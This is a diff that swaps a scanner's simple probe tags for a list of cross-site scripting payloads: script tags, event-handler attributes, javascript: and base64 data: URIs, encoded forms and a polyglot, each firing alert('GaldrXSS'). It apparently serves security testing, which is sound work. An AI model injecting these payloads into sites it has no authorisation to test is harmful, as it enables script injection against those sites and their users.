@@ -1,5 +1,26 @@
-<galdr_xss_test>
-galdr_scan_tag'
-galdr_scan_tag"
-<script>galdr_test()</script>
-'"><galdr_tag>
+# Comprehensive XSS Payloads
+
+# Basic Injection
+'"><script>alert("GaldrXSS")</script>
+<script>alert('GaldrXSS')</script>
+<scr<script>ipt>alert('GaldrXSS')</scr<script>ipt>
+"><img src=x onerror=alert('GaldrXSS')>
+' onmouseover=alert('GaldrXSS') '
+" onmouseover=alert('GaldrXSS') "
+
+# HTML Tag and Attribute Payloads
+<body onload=alert('GaldrXSS')>
+<iframe src="javascript:alert('GaldrXSS');"></iframe>
+<svg onload=alert('GaldrXSS')>
+<div style="width:100%;height:100%;" onmouseover="alert('GaldrXSS')"></div>
+<a href="javascript:alert('GaldrXSS')">Click Me</a>
+
+# URL and Encoding Payloads
+javascript:alert('GaldrXSS')
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnR2FsZHJYU1MnKTwvc2NyaXB0Pg==
+%3Cscript%3Ealert('GaldrXSS')%3C/script%3E
+
+# Polyglot Payloads
+jaVasCript:/*-/*`/*--`'/*"/**/(/* */oNcliCk=alert('GaldrXSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('GaldrXSS')//>\x3e
+"><script>/* */alert('GaldrXSS')</script>
+'"`><script>alert('GaldrXSS')</script>
